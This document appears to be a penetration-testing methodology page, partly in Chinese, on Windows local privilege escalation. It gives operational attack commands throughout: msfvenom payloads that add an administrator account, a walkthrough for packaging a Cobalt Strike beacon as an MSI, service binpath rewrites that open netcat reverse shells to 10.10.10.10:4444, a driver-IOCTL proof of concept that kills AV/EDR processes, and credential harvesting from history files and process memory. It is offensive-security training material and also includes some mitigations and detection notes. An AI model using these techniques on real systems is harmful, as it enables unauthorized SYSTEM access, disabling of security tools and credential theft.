# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **查找 Windows local privilege escalation vectors 的最佳工具：** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## 初始 Windows 理论

### Access Tokens

**如果你不知道什么是 Windows Access Tokens，请在继续之前阅读以下页面：**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**有关 ACLs - DACLs/SACLs/ACEs 的更多信息，请查看以下页面：**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**如果你不知道 Windows 中的 integrity levels 是什么，应该在继续之前阅读以下页面：**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows 中有不同的东西可能会**阻止你枚举系统**、运行可执行文件，甚至**检测你的活动**。你应该**阅读**下面的**页面**并**枚举**所有这些**防御****机制**，**在开始 privilege escalation enumeration 之前**：


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## System Info

### Version info enumeration

检查 Windows 版本是否存在已知漏洞（也请检查已应用的补丁）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### 版本漏洞利用

这个 [site](https://msrc.microsoft.com/update-guide/vulnerability) 对查找有关 Microsoft 安全漏洞的详细信息很有用。该数据库包含超过 4,700 个安全漏洞，展示了 Windows 环境所呈现的 **巨大的攻击面**。

**在系统上**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas 包含 watson)_

**在本地使用系统信息**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github 上的 exploits 仓库：**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 环境

是否有任何凭证/重要信息保存在环境变量中？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell 历史
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell 转录文件

你可以在 [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) 学习如何启用此功能
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell 管道执行的详细信息会被记录，包括已执行的命令、命令调用以及脚本的部分内容。但完整的执行细节和输出结果可能不会被捕获。

要启用此功能，请按照文档中 "Transcript files" 部分的说明操作，选择 **"Module Logging"** 而不是 **"Powershell Transcription"**。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
要查看 PowersHell logs 的最后 15 条事件，您可以执行：
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

完整的活动和脚本执行内容记录被捕获，确保每一段代码在运行时都被记录。此过程保留了每项活动的全面审计追踪，对取证和分析恶意行为非常有价值。通过在执行时记录所有活动，能够提供对该进程的详细洞察。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block 的日志事件可以在 Windows 事件查看器中的路径找到：**Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\ 要查看最近 20 条事件，您可以使用：
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### 互联网设置
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### 驱动器
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

如果更新请求不是使用 http**S** 而是使用 http，您可以入侵该系统。

要检查网络是否使用非 SSL 的 WSUS 更新，请在 cmd 中运行以下命令：
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
或者在 PowerShell 中运行以下命令：
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
如果你收到如下任一回复：
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

那么，**它是可被利用的。** 如果最后一个注册表项等于 `0`，则 WSUS 条目将被忽略。

为了利用此类漏洞，你可以使用像 [Wsuxploit](https://github.com/pimps/wsuxploit)、[pyWSUS](https://github.com/GoSecure/pywsus) 这样的工具 — 这些是 MiTM 武器化利用脚本，用于向非 SSL 的 WSUS 流量注入“伪造”更新。

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
基本上，这就是该漏洞所利用的缺陷：

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

你可以使用工具 [**WSUSpicious**](https://github.com/GoSecure/wsuspicious)（一旦发布）来利用此漏洞。

## Third-Party Auto-Updaters and Agent IPC (local privesc)

许多企业 agent 暴露一个本地 IPC 接口和一个有特权的更新通道。如果能将注册（enrollment）诱导到攻击者的服务器，并且 updater 信任一个恶意根 CA 或签名检查薄弱，本地用户就可以交付一个恶意的 MSI，由 SYSTEM 服务安装。基于 Netskope stAgentSvc 链（CVE-2025-0309）的通用技术见于：

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

在特定条件下，Windows **域** 环境中存在一个 **local privilege escalation** 漏洞。这些条件包括：环境中**未强制执行 LDAP signing**，用户拥有配置 **Resource-Based Constrained Delegation (RBCD)** 的自有权限，以及用户能够在域内创建计算机。值得注意的是，这些**要求**在默认设置下就已满足。

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** these 2 registers are **enabled** (value is **0x1**), then users of any privilege can **install** (execute) `*.msi` files as NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
如果你有 meterpreter 会话，你可以使用模块 **`exploit/windows/local/always_install_elevated`** 自动化此技术。

### PowerUP

使用 power-up 的 `Write-UserAddMSI` 命令在当前目录中创建一个用于提权的 Windows MSI 二进制文件。该脚本写出一个预编译的 MSI 安装程序，会提示添加用户/组（所以你将需要 GIU 访问）：
```
Write-UserAddMSI
```
只需执行生成的二进制即可提升权限。

### MSI 包装器

阅读本教程以学习如何使用这些工具创建 MSI 包装器。注意，如果你**只是**想**执行****命令行**，可以封装一个 **.bat** 文件


{{#ref}}
msi-wrapper.md
{{#endref}}

### 使用 WIX 创建 MSI


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### 使用 Visual Studio 创建 MSI

- 使用 Cobalt Strike 或 Metasploit 在 `C:\privesc\beacon.exe` 生成一个新的 Windows EXE TCP payload
- 打开 **Visual Studio**，选择 **Create a new project** 并在搜索框中输入 "installer"。选择 **Setup Wizard** 项目并点击 **Next**。
- 给项目命名，比如 **AlwaysPrivesc**，使用 **`C:\privesc`** 作为位置，选择 **place solution and project in the same directory**，然后点击 **Create**。
- 不断点击 **Next**，直到到达第 3 步（选择要包含的文件）。点击 **Add** 并选择你刚生成的 Beacon payload。然后点击 **Finish**。
- 在 **Solution Explorer** 中高亮 **AlwaysPrivesc** 项目，在 **Properties** 中将 **TargetPlatform** 从 **x86** 更改为 **x64**。
- 你还可以更改其他属性，例如 **Author** 和 **Manufacturer**，这能让已安装的应用看起来更真实。
- 右键点击项目并选择 **View > Custom Actions**。
- 右键点击 **Install** 并选择 **Add Custom Action**。
- 双击 **Application Folder**，选择你的 **beacon.exe** 文件并点击 **OK**。这将确保一旦运行安装程序，beacon payload 即被执行。
- 在 **Custom Action Properties** 下，将 **Run64Bit** 更改为 **True**。
- 最后，**build it**。
- 如果出现警告 `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`，请确保你已将平台设置为 x64。

### MSI 安装

要在后台执行恶意 `.msi` 文件的**安装**：
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
要 exploit 此漏洞，你可以使用：_exploit/windows/local/always_install_elevated_

## 防病毒软件与检测

### 审计设置

这些设置决定哪些内容会被**记录**，因此你应当注意
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding，了解日志被发送到哪里很有趣
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** 是为 **本地 Administrator 密码的管理** 设计的，确保加入域的计算机上的每个密码都是 **唯一、随机化且定期更新** 的。这些密码被安全地存储在 Active Directory 中，只有通过 ACLs 授予了足够权限的用户才能访问，从而在被授权的情况下查看本地管理员密码。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

如果启用，**明文密码会存储在 LSASS** (Local Security Authority Subsystem Service)。\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA 保护

从 **Windows 8.1** 开始，Microsoft 引入了对本地安全授权 (LSA) 的增强保护，以 **阻止** 不受信任进程 **读取其内存** 或注入代码的尝试，从而进一步提高系统安全。\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** 首次引入于 **Windows 10**。其目的是保护设备上存储的凭据，免受诸如 pass-the-hash 攻击之类的威胁。| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** 由 **Local Security Authority** (LSA) 验证，并被操作系统组件使用。当用户的登录数据被已注册的安全包验证时，通常会为该用户建立域凭证。\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## 用户与组

### 枚举用户与组

你应该检查你所属的各个组是否拥有可利用的权限
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特权组

如果你**属于某些特权组，你可能能够提升权限**。在此了解特权组以及如何滥用它们以提升权限：


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token 操作

**了解更多** 关于 **token** 的信息见本页: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
请查看以下页面以**了解有趣的 tokens**及如何滥用它们：


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### 已登录用户 / 会话
```bash
qwinsta
klist sessions
```
### 主目录
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### 密码策略
```bash
net accounts
```
### 获取剪贴板内容
```bash
powershell -command "Get-Clipboard"
```
## 运行中的进程

### 文件和文件夹权限

首先，在列出进程时**检查进程命令行中是否包含密码**。\
检查是否可以**覆盖某个正在运行的 binary**，或者你是否对 binary 文件夹有写权限，以便利用可能的 [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
始终检查是否有可能的 [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md)。

**检查进程二进制文件的权限**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**检查进程二进制文件所在文件夹的权限 (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

你可以使用 sysinternals 的 **procdump** 对运行中的进程创建内存转储。像 FTP 这样的服务在内存中会以明文保存 **credentials in clear text in memory**，可以尝试转储内存并读取这些信息。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 不安全的 GUI 应用

**以 SYSTEM 身份运行的应用程序可能允许用户生成 CMD，或浏览目录。**

示例： "Windows Help and Support" (Windows + F1), search for "command prompt", click on "Click to open Command Prompt"

## 服务

Service Triggers 让 Windows 在某些条件发生时启动服务（named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.）。即使没有 SERVICE_START 权限，你通常也可以通过触发它们的触发器来启动有特权的服务。有关枚举和激活的技术，请参见：

-
{{#ref}}
service-triggers.md
{{#endref}}

获取服务列表：
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 权限

你可以使用 **sc** 来获取服务的信息
```bash
sc qc <service_name>
```
建议获取来自 _Sysinternals_ 的二进制文件 **accesschk**，以检查每个服务所需的权限级别。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
建议检查 "Authenticated Users" 是否可以修改任何服务:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### 启用服务

如果你遇到此错误（例如与 SSDPSRV）：

_发生系统错误 1058。_\
_无法启动该服务，可能是因为它被禁用或与之关联的设备未启用。_

你可以使用以下命令启用它：
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**请注意服务 upnphost 依赖 SSDPSRV 才能工作（适用于 XP SP1）**

**另一个解决方法** 是运行：
```
sc.exe config usosvc start= auto
```
### **Modify service binary path**

在“Authenticated users”组对某服务拥有 **SERVICE_ALL_ACCESS** 的情况下，可以修改该服务的可执行二进制文件。要修改并执行 **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### 重启服务
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
可以通过以下权限实现权限提升：

- **SERVICE_CHANGE_CONFIG**: 允许重新配置服务的二进制文件。
- **WRITE_DAC**: 允许重新配置权限，从而可以更改服务配置。
- **WRITE_OWNER**: 允许获取所有权并重新配置权限。
- **GENERIC_WRITE**: 继承了更改服务配置的能力。
- **GENERIC_ALL**: 同样继承了更改服务配置的能力。

可使用 _exploit/windows/local/service_permissions_ 来检测和利用此漏洞。

### Services binaries weak permissions

**检查你是否可以修改由服务执行的二进制文件** 或者你是否对二进制所在的文件夹拥有 **写权限**（[**DLL Hijacking**](dll-hijacking/index.html)）**。**\
你可以使用 **wmic**（不在 system32 中）获取由服务执行的所有二进制文件，并使用 **icacls** 检查你的权限：
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
你也可以使用 **sc** 和 **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### 服务注册表修改权限

你应该检查是否可以修改任何服务注册表。\
你可以**检查**你对服务**注册表**的**权限**，方法如下：
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
应检查 **Authenticated Users** 或 **NT AUTHORITY\INTERACTIVE** 是否拥有 `FullControl` 权限。如果是，服务执行的二进制文件可以被修改。

要更改被执行二进制的 Path：
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### 服务注册表 AppendData/AddSubdirectory 权限

如果你对某个注册表拥有此权限，这意味着**你可以从该注册表创建子注册表**。在 Windows services 的情况下，这**足以执行任意代码：**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### 未加引号的服务路径

如果可执行文件的路径没有被引号包围，Windows 会尝试执行路径中每个空格之前的子路径。

例如，对于路径 _C:\Program Files\Some Folder\Service.exe_，Windows 会尝试执行：
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
列出所有未加引号的服务路径，排除属于内置 Windows 服务的那些：
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**你可以检测并利用** 该 vulnerability 使用 metasploit: `exploit/windows/local/trusted\_service\_path` 你可以手动使用 metasploit 创建一个 service binary:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 恢复操作

Windows 允许用户指定在服务失败时要采取的操作。此功能可以配置为指向一个 binary。如果该 binary 可被替换，可能会导致 privilege escalation。更多细节可在 [官方文档](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) 中找到。

## 应用程序

### 已安装的应用程序

检查 **permissions of the binaries**（可能可以覆盖其中一个并 escalate privileges）以及 **folders**（[DLL Hijacking](dll-hijacking/index.html)）。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 写入权限

检查是否可以修改某些 config file 以读取某些特殊文件，或是否可以修改将在 Administrator account (schedtasks) 执行的某个 binary。

在系统中查找弱文件夹/文件权限的一种方法是执行：
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### 启动时运行

**检查是否可以覆盖某些将由不同用户执行的注册表项或二进制文件。**\
**阅读** **以下页面** 以了解有关有趣的 **autoruns locations to escalate privileges** 的更多信息：

{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### 驱动程序

查找可能的 **第三方可疑/易受攻击的** 驱动程序
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
如果某个 driver 暴露了任意 kernel read/write primitive（常见于设计不良的 IOCTL 处理程序），你可以通过直接从 kernel memory 窃取 SYSTEM token 来提升权限。逐步技术见：

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### 注册表 hive 内存损坏原语

现代 hive 漏洞允许你调整确定性布局、滥用可写的 HKLM/HKU 子项，并在无需自定义 driver 的情况下将元数据损坏转化为 kernel paged-pool overflow。完整链条见：

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### 滥用在 device objects 上缺失的 FILE_DEVICE_SECURE_OPEN（LPE + EDR kill）

一些签名的第三方 drivers 通过 IoCreateDeviceSecure 使用强 SDDL 创建其 device object，但忘记在 DeviceCharacteristics 中设置 FILE_DEVICE_SECURE_OPEN。没有这个标志，当通过包含额外组件的路径打开设备时，secure DACL 不会被强制执行，使任何非特权用户可以通过使用如下命名空间路径获取句柄：

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

一旦用户可以打开该 device，driver 暴露的特权 IOCTLs 可被滥用于 LPE 和篡改。野外观测到的示例能力：
- 返回对任意进程的全访问句柄（通过 DuplicateTokenEx/CreateProcessAsUser 进行 token theft / SYSTEM shell）。
- 不受限制的 raw disk read/write（offline tampering、boot-time persistence 技巧）。
- 终止任意进程，包括 Protected Process/Light (PP/PPL)，允许通过 kernel 从 user land 杀掉 AV/EDR。

最小 PoC pattern（用户模式）：
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
开发者缓解措施
- 始终在创建打算通过 DACL 限制的 device objects 时设置 FILE_DEVICE_SECURE_OPEN。
- 验证调用者上下文以执行特权操作。在允许进程终止或返回句柄之前添加 PP/PPL 检查。
- 限制 IOCTLs（access masks、METHOD_*、输入校验），并考虑使用代理模型而不是直接授予内核权限（kernel privileges）。

防御者的检测思路
- 监控用户态对可疑设备名的打开（例如 \\ .\\amsdk*）以及指示滥用的特定 IOCTL 序列。
- 强制执行 Microsoft 的 vulnerable driver blocklist（HVCI/WDAC/Smart App Control），并维护自己的 allow/deny 列表。

## PATH DLL Hijacking

如果你拥有 **PATH 中某个文件夹的写权限**，你可能能够劫持进程加载的 DLL 并 **escalate privileges**。

检查 PATH 中所有文件夹的权限：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
有关如何滥用此检查的更多信息：

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## 网络

### 共享
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

检查 hosts file 中是否有其他已知计算机被 hardcoded
```
type C:\Windows\System32\drivers\etc\hosts
```
### 网络接口 & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
